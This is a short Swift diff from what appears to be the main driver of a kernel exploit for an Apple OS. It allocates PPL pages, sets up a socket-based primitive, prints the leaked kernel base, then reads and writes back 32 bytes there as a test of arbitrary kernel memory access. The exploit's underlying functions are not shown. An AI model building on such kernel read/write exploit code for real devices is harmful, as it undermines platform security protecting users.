@@ -13,15 +13,18 @@ guard allocatePPLpages() == true else {
 }
 
 guard let es = eSocket(count: 2048) else {
-    print("[Main] Unable to initialize read object, exiting.")
+    print("[Main] Unable to initialize object, exiting.")
     exit(1)
 }
 
 let kbase = es.getBase()
 print("[Main] Kernel base is at 0x\(String(kbase, radix: 16))")
 
+guard let out = es.get32B(address: kbase) else {
+    print("[Main] Unable to read object, exiting.")
+    exit(1)
+}
+print("[Main] Reading at kernel base", out)
 
-
-
-
+es.set32B(address: kbase, bytes: out)
 
